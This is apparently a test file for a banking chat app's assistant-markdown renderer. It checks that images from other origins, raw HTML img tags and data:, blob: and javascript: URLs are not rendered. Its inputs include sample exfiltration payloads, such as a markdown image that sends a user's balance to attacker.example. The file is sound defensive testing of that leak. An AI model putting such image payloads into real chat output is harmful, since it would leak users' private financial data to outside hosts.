// @vitest-environment jsdom
import { CopilotChatAssistantMessage } from '@copilotkit/react-core/v2';
import { act } from 'react';
import { createRoot } from 'react-dom/client';
import { describe, expect, it } from 'vitest';
import { ASSISTANT_MARKDOWN } from '../../../src/features/chat/assistant-markdown';
import { isSameOriginImage } from '../../../src/features/chat/lib/image-policy';

const ORIGIN = 'https://banco.example';
(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true;

/** Renders the way the chat does (Streamdown in streaming mode fills its blocks in an effect). */
async function render(content: string): Promise<HTMLElement> {
  const container = document.createElement('div');
  await act(async () =>
    createRoot(container).render(
      <CopilotChatAssistantMessage.MarkdownRenderer {...ASSISTANT_MARKDOWN} content={content} />,
    ),
  );
  return container;
}

const imageSources = (container: HTMLElement) => [...container.querySelectorAll('img')].map((img) => img.src);

describe('assistant markdown images', () => {
  it('renders no image from another origin, so nothing is fetched', async () => {
    const container = await render('Tu saldo es 1.500 ![x](https://attacker.example/p?d=1500)');
    expect(container.textContent).toContain('Tu saldo es 1.500');
    expect(imageSources(container)).toEqual([]);
    expect(container.innerHTML).not.toContain('attacker.example');
  });

  it('renders no image written as raw HTML either', async () => {
    expect(imageSources(await render('Hola <img src="https://attacker.example/p?d=1">'))).toEqual([]);
  });

  it('still renders an image from its own origin', async () => {
    expect(imageSources(await render('![logo](/logo.svg)'))).toEqual([`${location.origin}/logo.svg`]);
  });
});

describe('isSameOriginImage', () => {
  it.each([
    ['/logo.svg', true],
    [`${ORIGIN}/logo.svg`, true],
    ['https://attacker.example/p?d=1', false],
    ['//attacker.example/p', false],
    ['data:image/png;base64,AAAA', false],
    ['blob:https://banco.example/1', false],
    ['javascript:alert(1)', false],
  ])('%s → %s', (src, allowed) => {
    expect(isSameOriginImage(src, ORIGIN)).toBe(allowed);
  });

  it('refuses everything without a page origin', () => {
    expect(isSameOriginImage('/logo.svg', undefined)).toBe(false);
  });
});
